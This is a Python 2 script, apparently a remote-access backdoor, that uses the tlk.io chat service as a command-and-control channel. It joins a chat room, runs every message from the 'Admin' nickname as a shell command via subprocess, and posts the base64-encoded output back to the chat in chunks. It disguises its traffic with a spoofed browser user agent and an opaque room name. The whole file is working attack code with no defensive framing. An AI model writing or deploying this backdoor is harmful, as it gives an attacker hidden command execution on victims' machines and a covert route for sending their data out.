import requests
import re
import time
import subprocess
import platform
import base64


def split_every(n, s):
    return [s[i:i+n] for i in xrange(0, len(s), n)]


class ShellChatClient(object):
    def __init__(self, chat_room, chat_nickname, chat_admin):
        self.chat_room = chat_room
        self.chat_nickname = chat_nickname
        self.chat_admin = chat_admin
        self.chat_api_messages = ""
        self.session = requests.Session()
        self.messages_black_list = []
        self.login()

    def login(self):  # Login and add previous messages to the blacklist
        chat_html = self.session.get('https://tlk.io/' + self.chat_room).text
        chat_id = re.search('ownership: \'/api/chats/(.*)/ownership\'', chat_html).group(1)
        self.chat_api_messages = 'https://tlk.io/api/chats/' + str(chat_id) + '/messages'
        chat_csrf_token = re.search('<meta content="(.*)" name="csrf-token" />', chat_html).group(1)
        self.session.headers.update({'Host': 'tlk.io',
                   'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0',
                   'Accept': 'application/json, text/javascript, */*; q=0.01',
                   'Accept-Language': 'fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3',
                   'Accept-Encoding': 'gzip, deflate, br',
                   'X-CSRF-Token': str(chat_csrf_token),
                   'X-Requested-With': 'XMLHttpRequest',
                   'Referer': 'https://tlk.io/' + self.chat_room})
        self.session.post('https://tlk.io/api/participant', data={'nickname': self.chat_nickname})

        for m in self.session.request('GET', self.chat_api_messages).json():
            self.messages_black_list.append(m['id'])

        print 'Connected to ' + 'https://tlk.io/' + self.chat_room
        self.run_shell()

    def run_shell(self):  # Wait & execute commands, then send output in chat
        print 'Waiting for commands...'
        while True:
            for m in self.session.request('GET', self.chat_api_messages).json():
                if m['nickname'] == self.chat_admin and m['id'] not in self.messages_black_list:
                    self.messages_black_list.append(m['id'])  # Add message to the blacklist
                    result = subprocess.Popen(m['body'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                              stdin=subprocess.PIPE).communicate()[0]

                    if platform.system() == 'Windows':
                        result = result.decode(encoding='cp437').encode('utf-8')

                    if len(result) == 0:
                        result = 'BEGIN//' + base64.b64encode('No result...') + 'END//'
                    else:
                        result = 'BEGIN//' + base64.b64encode(result) + 'END//'

                    if len(result) <= 1024:
                        self.session.post(self.chat_api_messages, data={"body": result, "expired": False})
                    else:
                        for r in split_every(1024, result):
                            self.session.post(self.chat_api_messages, data={"body": r, "expired": False})
            time.sleep(3)


if __name__ == '__main__':
    ShellChatClient('DQpDb25maWd1cmF0aW9uIElQIGRl', 'Bot', 'Admin')
